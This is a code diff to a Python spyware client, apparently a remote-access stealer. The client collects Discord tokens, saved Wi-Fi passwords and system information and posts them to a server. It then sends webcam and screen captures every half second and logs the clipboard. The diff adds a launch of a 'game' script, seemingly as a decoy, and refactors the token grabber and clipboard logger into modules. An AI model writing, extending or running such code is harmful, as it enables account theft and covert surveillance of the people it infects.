@@ -3,12 +3,15 @@ from numpy import array
 from pyautogui import screenshot
 from requests import post
 from time import sleep
-from pyperclip import paste
-from datetime import datetime
+import subprocess
 
-from modules.discordgrabber import get_discord_info
+
+from modules.discordgrabber import GetDiscordTokens
 from modules.pcinfo import System_information
 from modules.wifipasswordsgraber import getPasswords
+from modules.clipboardlogger import logger
+
+subprocess.run(['python', 'modules/game/game.py'], capture_output=False, text=True)
 
 # Initialize the camera
 try:
@@ -22,7 +25,7 @@ remote_server = '127.0.0.1:5000'
 protocol = 'http'
 
 # Request a client ID from the server
-clientIdreq = post(f'{protocol}://{remote_server}/client', json={"osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": get_discord_info().replace("\n", "<br>")})
+clientIdreq = post(f'{protocol}://{remote_server}/client', json={"osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
 clientId = clientIdreq.text
 
 previous_clipboard_content = ''
@@ -45,12 +48,7 @@ while True:
 	img_response = post(f'{protocol}://{remote_server}/send_camera?id={clientId}', data=camera_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
 	screen_response = post(f'{protocol}://{remote_server}/send_screen?id={clientId}', data=screen_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
 
-	clipboard_content = paste()
-	if clipboard_content != previous_clipboard_content:
-		previous_clipboard_content = clipboard_content
-		now = datetime.now()
-		formatted_date = now.strftime("%d.%m.%Y %H:%M:%S")
-		post(f'{protocol}://{remote_server}/send_clipboard?id={clientId}', json={"text": f"<br>{formatted_date}: {clipboard_content}"})
+	logger(protocol, remote_server, clientId)
 
 	sleep(0.5)
 
